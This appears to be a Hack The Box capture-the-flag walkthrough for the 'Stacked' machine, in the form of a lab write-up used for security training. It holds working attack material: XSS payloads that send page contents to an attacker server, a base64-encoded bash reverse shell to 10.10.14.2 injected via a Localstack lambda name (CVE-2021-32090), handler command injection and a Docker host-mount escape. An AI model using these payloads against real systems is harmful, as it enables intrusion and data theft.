## Stacked

https://app.hackthebox.com/machines/379

### XSS

Open 10.10.11.112:22
Open 10.10.11.112:80
Open 10.10.11.112:2376

Enumerate subdomains.
```
wfuzz -H "Host: FUZZ.stacked.htb" -u http://stacked.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt --hw 26

000001183:   200        444 L    1779 W     30268 Ch    "portfolio" 
```

<br>

The contact form on portfolio subdomain is vulnerable to XSS. To discover which field, we can use different payload on all of them.

Sending the payload below, we get "XSS detected!" response.
```
<script>document.location="http://10.10.14.2/subject.html"</script>
```

We try injecting XSS on other places, util we find the Referer header is vulnerable.
```
Referer: <script>document.location="http://10.10.14.2/referer"</script>
```

We can just redirect our file instead of the entire page.
```
<script src="http://10.10.14.2/xss.js"></script>
```

<br>

Since we don't know what to access, we can enumerate things.

This JS will send the current location of the page back to our server.
```js
var exfilreq = new XMLHttpRequest();    
exfilreq.open("GET", "http://10.10.14.2/" + document.location, false);    
exfilreq.send(); 
```

And we get this path:
```
10.10.11.112 - - [24/Aug/2021 11:42:04] "GET /http://mail.stacked.htb/read-mail.php?id=2 HTTP/1.1" 404 -
```

We can update the JS to pull the full page HTML, but we need to change the server to nc since python HTTP server doesn't handle POST requests.

```js
var exfilreq = new XMLHttpRequest();    
exfilreq.open("POST", "http://10.10.14.2:9001/", false);    
exfilreq.send(document.documentElement.outerHTML); 
```

With this, we enumerate dashboard.php. Let's get this page.
```js
var dashboardreq = new XMLHttpRequest();    
dashboardreq.onreadystatechange = function() {              
  if (dashboardreq.readyState == 4) {                       
    var exfilreq = new XMLHttpRequest();                    
    exfilreq.open("POST", "http://10.10.14.2:9001/", false);                                                      
    exfilreq.send(dashboardreq.response);                 
  }     
};    
dashboardreq.open('GET', '/dashboard.php', false);    
dashboardreq.send();  
```

We enumerate read-mail.php?id=1, so lets repeat to process to this changing the page name.

We have this on read-mail:
```
Hey Adam, I have set up S3 instance on s3-testing.stacked.htb so that you can configure the IAM users, roles and permissions. I have initialized a serverless instance for you to work from but keep in mind for the time being you can only run node instances. If you need anything let me know. Thanks.
```

Let's add s3-testing.stacked.htb to /etc/hosts.

IppSec did the XSS like this:
```js
var target = "http://mail.stacked.htb/read-mail.php?id=1";
var req1 = new XMLHttpRequest();
req1.open('GET', target, false);
req1.send();
var response = req1.responseText;

var req2 = new XMLHttpRequest();
req2.open('POST', "http://10.10.14.2:9001/", false);
req2.send(response);
```

<br>

#### Not for OSWE

We can download the docker-compose.yml that the page give to us.
```yaml
version: "3.3"

services:
  localstack:
    container_name: "${LOCALSTACK_DOCKER_NAME-localstack_main}"
    image: localstack/localstack-full:0.12.6
    network_mode: bridge
    ports:
      - "127.0.0.1:443:443"
      - "127.0.0.1:4566:4566"
      - "127.0.0.1:4571:4571"
      - "127.0.0.1:${PORT_WEB_UI-8080}:${PORT_WEB_UI-8080}"
    environment:
      - SERVICES=serverless
      - DEBUG=1
      - DATA_DIR=/var/localstack/data
      - PORT_WEB_UI=${PORT_WEB_UI- }
      - LAMBDA_EXECUTOR=${LAMBDA_EXECUTOR- }
      - LOCALSTACK_API_KEY=${LOCALSTACK_API_KEY- }
      - KINESIS_ERROR_PROBABILITY=${KINESIS_ERROR_PROBABILITY- }
      - DOCKER_HOST=unix:///var/run/docker.sock
      - HOST_TMP_FOLDER="/tmp/localstack"
    volumes:
      - "/tmp/localstack:/tmp/localstack"
      - "/var/run/docker.sock:/var/run/docker.sock"
```

Localstack 0.12.6 has a XSS vulnerability that leads to RCE: [CVE-2021-32090](https://nvd.nist.gov/vuln/detail/CVE-2021-32090).

```
# Configure with region "us-east-1"
aws configure

# Create a js and zip with the content below
exports.handler =  async function(event, context) {
  console.log("EVENT: \n" + JSON.stringify(event, null, 2))
  return context.logStreamName
}

# Creating lambda
aws lambda create-function --endpoint=http://s3-testing.stacked.htb --function-name 'a' --zip-file fileb://index.zip --role DoesNotMatter --handler index.handler --runtime nodejs10.x

# Testing
aws lambda invoke --endpoint=http://s3-testing.stacked.htb --function-name a output
```

RCE.

```
echo -n 'bash -i >& /dev/tcp/10.10.14.2/9001 0>&1' | base64 -w 0
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yLzkwMDEgMD4mMQ==                              

aws lambda create-function --endpoint=http://s3-testing.stacked.htb --function-name 'c; echo -n YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yLzkwMDEgMD4mMQ== | base64 -d | bash' --zip-file fileb://index.zip --role DoesNotMatter --handler index.handler --runtime nodejs10.x

# Trigger the XSS putting this payload on the Referer:
<script>document.location="http://127.0.0.1:8080"</script>
```

#### Privilege Escalation
Create another reverse shell but with root now.
```
# Create a /tmp/shell.sh first
aws lambda create-function --function-name shell --handler 'index.handler;$(bash /tmp/shell.sh)' --zip-file fileb://index.zip --role arn:aws:iam::123456789012:role/lambda-role --endpoint-url http://s3-testing.stacked.htb --runtime nodejs12.x

aws lambda invoke --function-name shell --endpoint-url http://s3-testing.stacked.htb out.json
```

Privesc to escape the docker.
```
# Enumerate image
docker image ls

# Starts images
docker run -d -v /:/mnt -it 0601ea177088

# Enumerate process
docker ps

# Execute it
docker exec -it ed195f9534d9 bash

# Read flag
f2d6d176d679b9ba649069ad8934cc6c

# You can save a SSH key inside /mnt/root/.ssh to have bash access
```
